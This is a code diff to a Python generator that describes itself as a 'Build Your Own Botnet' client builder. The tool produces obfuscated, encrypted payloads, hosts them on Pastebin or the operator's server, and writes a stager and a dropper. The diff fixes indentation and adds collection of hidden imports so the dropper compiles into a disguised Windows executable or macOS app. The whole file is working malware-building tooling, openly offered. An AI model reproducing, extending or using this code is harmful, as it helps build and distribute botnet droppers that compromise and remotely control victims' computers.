@@ -89,8 +89,8 @@ def main():
         prog='client.py', 
         version='0.1.4',
         description="Client Generator (Build Your Own Botnet)",
-	usage="""client.py [-h] [-v] [-n/--name NAME] [-i/--icon ICON]
-		 [--pastebin API-KEY] [--randomize] [--encrypt]
+    usage="""client.py [-h] [-v] [-n/--name NAME] [-i/--icon ICON]
+         [--pastebin API-KEY] [--randomize] [--encrypt]
                  [--obfuscate] [--compress] [--compile]
                  host port [module [module ...]]""")
 
@@ -105,22 +105,22 @@ def main():
                         help='server port number')
 
     parser.add_argument('modules',
-			metavar='remote imports',
+            metavar='remote imports',
                         action='append',
                         nargs='*',
                         help='modules to remotely import at run-time')
 
     parser.add_argument('-n','--name',
-			action='store',
-			help='output file name')
+            action='store',
+            help='output file name')
 
     parser.add_argument('-i','--icon',
-			action='store',
-			help='icon image file name')
+            action='store',
+            help='icon image file name')
 
     parser.add_argument('--pastebin',
                         action='store',
-			metavar='API',
+            metavar='API',
                         help='upload & host payload on pastebin')
 
     parser.add_argument('--randomize',
@@ -179,6 +179,7 @@ def run(options):
     key     = base64.b64encode(os.urandom(16))
     var     = generators.variable(3)
     imports = set()
+    hidden_imports = set()
 
     # modules
     util.display("\n[>]", color='yellow', style='bright', end=',')
@@ -188,7 +189,7 @@ def run(options):
         util.display('    adding {}...'.format(os.path.splitext(m)[0].replace('/','.')), color='reset', style='dim')
     if len(options.modules):
         for m in options.modules:
-	    if isinstance(m, str):
+            if isinstance(m, str):
                 util.display('\tadding {}...'.format(m), color='reset', style='dim')
                 base = os.path.splitext(os.path.basename(m))[0]
                 if not os.path.exists(m):
@@ -207,10 +208,30 @@ def run(options):
         for line in open(module, 'r').read().splitlines():
             if len(line.split()):
                 if line.split()[0] == 'import':
-		    imports.add(line.strip())
-		elif len(line.split()) > 3:
-		    if line.split()[0] == 'from' and line.split()[1] != '__future__' and line.split()[2] == 'import':
-			imports.add(line.strip())
+                    for x in ['core'] + [os.path.splitext(i)[0] for i in os.listdir('core')] + ['core.%s' % s for s in [os.path.splitext(i)[0] for i in os.listdir('core')]]:
+                        if x in line:
+                            break
+                    else:
+                        imports.add(line.strip())
+                        for i in line.split()[1].split(';')[0].split(','):
+                            i = line.split()[1] if i == '*' else i
+                            hidden_imports.add(i)
+                            util.display('\tadding {}...'.format(i), color='reset', style='dim')
+                elif len(line.split()) > 3:
+                    if line.split()[0] == 'from' and line.split()[1] != '__future__' and line.split()[2] == 'import':
+                        for x in ['core'] + [os.path.splitext(i)[0] for i in os.listdir('core')] + ['core.%s' % s for s in [os.path.splitext(i)[0] for i in os.listdir('core')]]:
+                            if x in line.strip():
+                                break
+                        else:
+                            imports.add(line.strip())
+                            for i in str().join(line.split()[3:]).split(';')[0].split(','):
+                                i = line.split()[1] if i == '*' else i
+                                hidden_imports.add(i)
+                                util.display('\tadding {}...'.format(i), color='reset', style='dim')
+                else:
+                    pass
+    imports = list(imports)
+    hidden_imports = list(hidden_imports)
     util.display("    [+]", color='green', style='bright', end=',')
     util.display("{} Imports Complete".format(len(list(imports))), color='reset', style='dim')
                  
@@ -245,12 +266,12 @@ def run(options):
     if options.pastebin:
         url  = util.pastebin(payload, api_dev_key=options.pastebin)
     else:
-    	dirs = ['modules/payloads','byob/modules/payloads','byob/byob/modules/payloads']
+        dirs = ['modules/payloads','byob/modules/payloads','byob/byob/modules/payloads']
         dirname = '.'
-    	for d in dirs:
-    	    if os.path.isdir(d):
-        		dirname = d
-    	path = os.path.join(os.path.abspath(dirname), var + '.py' )
+        for d in dirs:
+            if os.path.isdir(d):
+                dirname = d
+        path = os.path.join(os.path.abspath(dirname), var + '.py' )
         with file(path, 'w') as fp:
             fp.write(payload)
         s = 'http://{}:{}/{}'.format(options.host, options.port, urllib.pathname2url(path.strip(os.getcwd())))
@@ -302,7 +323,7 @@ def run(options):
     util.display("Upload Complete", color='reset', style='bright')
     util.display("\t(hosting stager at: {}".format(url2), color='reset', style='dim')
 
-    # client
+    # dropper
     util.display("\n[>]", color='yellow', style='bright', end=',')
     util.display("Dropper", color='reset', style='bright')
     name = 'byob_{}.py'.format(var) if not options.name else options.name
@@ -312,16 +333,18 @@ def run(options):
     with file(name, 'w') as fp:
         fp.write(dropper)
 
-    # dropper
     if options.compile:
+        util.display('\n    Compiling dropper...', color='reset', style='dim', end=',')
+        __load__ = threading.Event()
+        __spin__ = util.spinner(__load__)
         if sys.platform == 'darwin':
-            name   = generators.app(name, icon=options.icon)
-            output = open(os.path.join(name, 'Content', 'MacOS', os.path.basename(name))).read()
+            name = generators.app(name, icon=options.icon)
         else:
-            name   = generators.exe(name, icon=options.icon)
-            output = open(name, 'rb').read()
-    progress_update(dropper, output, task='Dropper')
-    util.display("    (saved to file: {})".format(os.path.join((os.getcwd(), name))).ljust(80 - len("    [+]")), style='dim', color='reset')
+            name = generators.exe(name, icon=options.icon, hidden_imports=hidden_imports)
+        __load__.set()
+        util.display("\n    [+]", color='green', style='bright', end=',')
+        util.display("Compiled Dropper Complete", color='reset', style='bright')
+    util.display("\t(saved to file: {})".format(name).ljust(80 - len("    [+]")), style='dim', color='reset')
     return name
 
 if __name__ == '__main__':
